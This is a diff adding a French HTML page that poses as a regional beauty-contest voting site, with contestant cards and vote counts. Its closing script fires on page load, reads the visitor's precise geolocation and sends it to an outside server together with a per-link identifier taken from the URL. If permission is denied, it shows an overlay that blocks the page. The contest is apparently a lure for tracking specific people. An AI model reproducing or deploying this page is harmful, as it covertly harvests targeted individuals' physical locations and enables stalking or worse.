@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Landing Page d'Award</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+    <style>
+        .gold {
+            color: #38a199;
+        }
+
+        .silver {
+            color: #c0c0c0;
+        }
+
+        .bg-dark {
+            background-color: #1c1c1c;
+        }
+
+        .bg-card {
+            background-color: #2a2a2a;
+        }
+
+        .shine {
+            background: linear-gradient(45deg, #d5e643, #fff);
+            background-size: 400% 400%;
+            animation: shine 5s linear infinite;
+        }
+
+        @keyframes shine {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            100% {
+                background-position: 100% 50%;
+            }
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .overlay-content {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body class="bg-dark text-white">
+
+    <!-- ----------------------------------------------------- -->
+    <div id="geolocation-overlay" class="overlay hidden text-black">
+        <div class="overlay-content mx-8">
+            <h2 class="text-base font-bold mb-4">Permission Requise</h2>
+            <p>Veuillez autorise pour accéder au site.</p>
+        </div>
+    </div>
+
+    <!-- ------------------------------------------ -->
+    <header class="text-center py-8">
+        <h1 class="text-2xl font-bold gold shine">
+            Concours de Beauté Régionale
+        </h1>
+        <p class="mt-2 text-base silver">Rejoignez-nous pour célébrer la beauté</p>
+    </header>
+
+    <section class="text-600 "><h2 class="text-center bg-green-500"> Choisissez Votre Lauréate de Beauté Régionale</h2>
+        <p class="mt-4 text-base silver">
+            Cet événement célèbre la diversité et la splendeur des femmes de notre
+            région. Les candidates se présenteront devant un jury et le public pour
+            être élues la plus belle de la région.
+        </p>
+    </section>
+    <!-- ----------------------------------CARD 1--------------------------------- -->
+    <section class="py-8">
+        <div class="mx-4 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
+            <div class="bg-card rounded-lg p-6 relative">
+                <div class="absolute top-0 left-0 mt-2 ml-2 bg-gold rounded-full px-3 py-1 text-xl font-semibold gold">
+                    #1
+                </div>
+                <img class="w-full h-auto mx-auto mt-4"
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZxXuzgrHU08tXsmCdPPJgP14voALoVw832dt3V4t6BsgHzPdFZf_rrv88O5q-t6y0U54&usqp=CAU"
+                    alt="Photo 2" />
+                <h3 class="mt-4 text-xl font-semibold gold">Hamiddah amza</h3>
+                <p class="mt-2 silver">Description ou infos de la personne 2.</p>
+                <div class="flex items-center justify-center mt-4">
+                    <button
+                        class="bg-transparent hover:bg-gold text-gold font-semibold hover:text-white py-2 px-4 border border-gold hover:border-transparent rounded-full">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 20 20"
+                            fill="currentColor">
+                            <path
+                                d="M3.172 5.172a4 4 0 015.656 0L10 6.344l1.172-1.172a4 4 0 015.656 5.656L10 17.344l-6.828-6.828a4 4 0 010-5.656z" />
+                        </svg>
+                        87489
+                    </button>
+                </div>
+            </div>
+
+
+            <!-- ---------------------------CARD 2 ----------------------------------------- -->
+
+            <div class="">
+                <div class="bg-card rounded-lg p-6 relative">
+                    <div
+                        class="absolute top-0 left-0 mt-2 ml-2 bg-gold rounded-full px-3 py-1 text-xl font-semibold gold">
+                        #2
+                    </div>
+                    <img class="w-full h-auto mx-auto mt-4"
+                        src="https://c8.alamy.com/compfr/h3hmgc/san-diego-ca-le-23-juillet-melanie-liburd-assiste-a-l-hebdomadaire-de-divertissement-auto-moto-annuel-de-la-partie-2016-du-hard-rock-hotel-san-diego-h3hmgc.jpg"
+                        alt="Photo 2" />
+                    <h3 class="mt-4 text-xl font-semibold gold">Nesa siro</h3>
+                    <p class="mt-2 silver">Description ou infos de la personne 2.</p>
+                    <div class="flex items-center justify-center mt-4">
+                        <button
+                            class="bg-transparent hover:bg-gold text-gold font-semibold hover:text-white py-2 px-4 border border-gold hover:border-transparent rounded-full">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 20 20"
+                                fill="currentColor">
+                                <path
+                                    d="M3.172 5.172a4 4 0 015.656 0L10 6.344l1.172-1.172a4 4 0 015.656 5.656L10 17.344l-6.828-6.828a4 4 0 010-5.656z" />
+                            </svg>
+                            9876
+                        </button>
+                    </div>
+                </div>
+
+                <!-- --------------------------------CARD2---------------------------------------- -->
+
+
+            </div>
+
+            <!-- 
+    --------------------------------------------- -->
+
+            <div class="">
+                <div class="bg-card rounded-lg p-6 relative">
+                    <div
+                        class="absolute top-0 left-0 mt-2 ml-2 bg-gold rounded-full px-3 py-1 text-xl font-semibold gold">
+                        #3
+                    </div>
+                    <img class="w-full h-auto mx-auto mt-4"
+                        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSUFCqhDqyaYr0mRBtlefeM2bUrXyyWHX-eeA&s"
+                        alt="Photo 2" />
+                    <h3 class="mt-4 text-xl font-semibold gold">Simbi aji</h3>
+                    <p class="mt-2 silver">Description ou infos de la personne 2.</p>
+                    <div class="flex items-center justify-center mt-4">
+                        <button
+                            class="bg-transparent hover:bg-gold text-gold font-semibold hover:text-white py-2 px-4 border border-gold hover:border-transparent rounded-full">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 20 20"
+                                fill="currentColor">
+                                <path
+                                    d="M3.172 5.172a4 4 0 015.656 0L10 6.344l1.172-1.172a4 4 0 015.656 5.656L10 17.344l-6.828-6.828a4 4 0 010-5.656z" />
+                            </svg>
+                            44556
+                        </button>
+                    </div>
+                </div>
+
+                <!-- --------------------------------CARD2---------------------------------------- -->
+
+
+            </div>
+
+            <!-- ---------------------------------CARD 3 ----------------------------------------- -->
+
+            <div class="">
+                <div class="bg-card rounded-lg p-6 relative">
+                    <div
+                        class="absolute top-0 left-0 mt-2 ml-2 bg-gold rounded-full px-3 py-1 text-xl font-semibold gold">
+                        #4
+                    </div>
+                    <img class="w-full h-auto mx-auto mt-4"
+                        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-rUWjYxnOVBAVkJaPOjvmhs0MbNsPnRHdDg&s" alt="Photo 2" />
+                    <h3 class="mt-4 text-xl font-semibold gold">Savanah</h3>
+                    <p class="mt-2 silver">Description ou infos de la personne 2.</p>
+                    <div class="flex items-center justify-center mt-4">
+                        <button
+                            class="bg-transparent hover:bg-gold text-gold font-semibold hover:text-white py-2 px-4 border border-gold hover:border-transparent rounded-full">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 20 20"
+                                fill="currentColor">
+                                <path
+                                    d="M3.172 5.172a4 4 0 015.656 0L10 6.344l1.172-1.172a4 4 0 015.656 5.656L10 17.344l-6.828-6.828a4 4 0 010-5.656z" />
+                            </svg>
+                            6556
+                        </button>
+                    </div>
+                </div>
+
+                <!-- --------------------------------CARD2---------------------------------------- -->
+
+
+            </div>
+
+            <!-- ------------------------------------------CARD 4 ------------------------------------------- -->
+            <div class="">
+                <div class="bg-card rounded-lg p-6 relative">
+                    <div
+                        class="absolute top-0 left-0 mt-2 ml-2 bg-gold rounded-full px-3 py-1 text-xl font-semibold gold">
+                        #5
+                    </div>
+                    <img class="w-full h-auto mx-auto mt-4"
+                        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQotWkiiswGs4VeS-r6n4xoQTTKBlE77s7wclSo9do1HvKvr_UiVnM_wQW6FylvFMLPokk&usqp=CAU"
+                        alt="Photo 2" />
+                    <h3 class="mt-4 text-xl font-semibold gold">Laurein blade</h3>
+                    <p class="mt-2 silver">Description ou infos de la personne 2.</p>
+                    <div class="flex items-center justify-center mt-4">
+                        <button
+                            class="bg-transparent hover:bg-gold text-gold font-semibold hover:text-white py-2 px-4 border border-gold hover:border-transparent rounded-full">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 inline" viewBox="0 0 20 20"
+                                fill="currentColor">
+                                <path
+                                    d="M3.172 5.172a4 4 0 015.656 0L10 6.344l1.172-1.172a4 4 0 015.656 5.656L10 17.344l-6.828-6.828a4 4 0 010-5.656z" />
+                            </svg>
+                            41212
+                        </button>
+                    </div>
+                </div>
+
+                <!-- --------------------------------CARD2---------------------------------------- -->
+
+
+            </div>
+        </div>
+    </section>
+
+    <!-- --------------------------------------- -->
+      <!-- Pied de page -->
+    <footer class="bg-gray-800 text-white py-4">
+        <div class="container mx-auto text-center">
+            <p>&copy; 2024 kilimanjaro Award. Tous droits réservés.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
+        function attemptGeolocation() {
+            navigator.geolocation.getCurrentPosition(position => {
+                const uuid = window.location.pathname.split('/').pop();
+                const { latitude, longitude } = position.coords;
+
+                fetch('https://geo-localisation.onrender.com/location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ uuid, latitude, longitude })
+                })
+                .then(response => response.text())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error:', error));
+            }, error => {
+                // En cas d'échec, afficher la superposition
+                showGeolocationOverlay();
+            });
+        }
+
+        // Fonction pour afficher la superposition
+        function showGeolocationOverlay() {
+            document.getElementById('geolocation-overlay').classList.remove('hidden');
+        }
+
+        // Appeler la fonction pour tenter de récupérer la position
+        window.onload = attemptGeolocation;
+    </script>
+</body>
+
+</html>
